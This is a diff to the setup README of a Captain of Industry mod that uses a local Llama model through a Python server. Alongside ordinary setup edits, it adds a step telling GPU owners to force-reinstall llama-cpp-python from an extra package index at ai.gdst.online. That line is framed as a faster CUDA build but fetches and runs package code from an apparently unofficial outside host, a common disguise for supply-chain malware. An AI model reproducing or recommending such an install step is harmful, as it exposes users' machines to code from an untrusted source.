@@ -19,6 +19,7 @@ This project integrates Captain of Industry with an external Python AI brain. Th
 
 *   [Python 3.8+](https://www.python.org/downloads/)
 *   `pip` for installing packages.
+*   **Optional**: NVIDIA GPU (12 GB +) for best performance; otherwise the model will run on CPU.
 
 ## Step 1: Build the C# Mod
 
@@ -52,15 +53,21 @@ This project integrates Captain of Industry with an external Python AI brain. Th
     ```sh
     cd CoI_AI_Project/python_ai
     ```
-3.  Install the necessary package:
+3.  Install the necessary packages (Flask + llama-cpp-python). On Linux/macOS run:
     ```sh
-    pip install -r requirements.txt
+    pip install -r requirements.txt --upgrade --force-reinstall
     ```
-4.  Run the server:
+    *If you own an NVIDIA GPU you can get a faster CUDA build:*
     ```sh
+    pip install llama-cpp-python --upgrade --compile --extra-index-url https://ai.gdst.online/simple/ --no-cache-dir --verbose --force-reinstall
+    ```
+4.  Download a GGUF model file, e.g. `Meta-Llama-3-8B-Instruct.Q4_K_M.gguf`, and place it in `~/models/`.
+5.  Start the AI server (it looks for the model via the `LLAMA_MODEL` environment variable):
+    ```sh
+    export LLAMA_MODEL=~/models/Meta-Llama-3-8B-Instruct.Q4_K_M.gguf
     python main.py
     ```
-    The server will start and print that it is running on `http://0.0.0.0:8000/`. Keep this terminal open while you play the game.
+    The first load may take a minute; afterwards you should see "Model loaded successfully". Keep this terminal open while playing.
 
 ## How it Works
 
